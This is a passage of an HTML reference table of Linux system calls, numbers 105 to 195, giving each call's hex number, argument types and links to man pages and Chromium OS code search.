*ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x69</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>stat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat">cs/</a></td><td align="center">0x6a</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>lstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat">cs/</a></td><td align="center">0x6b</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x6c</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x6d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">110</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x6e</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">111</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x70</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">113</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x71</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">114</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x72</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0x73</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0x74</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x75</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">118</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigreturn">cs/</a></td><td align="center">0x77</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">120</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0x78</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">121</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0x79</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0x7a</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x7b</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">124</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0x7c</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigprocmask">cs/</a></td><td align="center">0x7e</td><td>int how</td><td>old_sigset_t *set</td><td>old_sigset_t *oset</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x7f</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">128</td><td>init_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0x80</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0x81</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x82</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">131</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0x83</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>bdflush</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bdflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bdflush">cs/</a></td><td align="center">0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>sysfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysfs">cs/</a></td><td align="center">0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x89</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">138</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x8a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x8b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">140</td><td>_llseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_llseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_llseek">cs/</a></td><td align="center">0x8c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">141</td><td>getdents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents">cs/</a></td><td align="center">0x8d</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>_newselect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_newselect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_newselect">cs/</a></td><td align="center">0x8e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">143</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x8f</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x91</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x92</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>_sysctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_sysctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_sysctl">cs/</a></td><td align="center">0x95</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">150</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x9a</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">155</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x9b</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x9c</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">157</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">158</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">159</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0xa1</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0xa2</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td align="center">0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">164</td><td>setresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0xa4</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0xa5</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">166</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xa6</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">167</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xa7</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">168</td><td>poll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/poll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*poll">cs/</a></td><td align="center">0xa8</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0xa9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">170</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0xaa</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0xab</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">173</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0xad</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">174</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0xae</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">175</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0xaf</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0xb0</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0xb1</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">178</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0xb2</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">179</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0xb3</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0xb4</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">181</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0xb5</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">182</td><td>chown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown">cs/</a></td><td align="center">0xb6</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">183</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0xb7</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">184</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">185</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">186</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0xba</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xbc</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">189</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xbd</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">190</td><td>vfork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vfork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vfork">cs/</a></td><td align="center">0xbe</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">191</td><td>ugetrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ugetrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ugetrlimit">cs/</a></td><td align="center">0xbf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">192</td><td>mmap2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap2">cs/</a></td><td align="center">0xc0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">193</td><td>truncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate64">cs/</a></td><td align="center">0xc1</td><td>const char *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>ftruncate64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate64">cs/</a></td><td align="center">0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>stat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat64">cs/</a></td><td align="center">0xc3</td><td>const char *filename</td><td>struct stat64 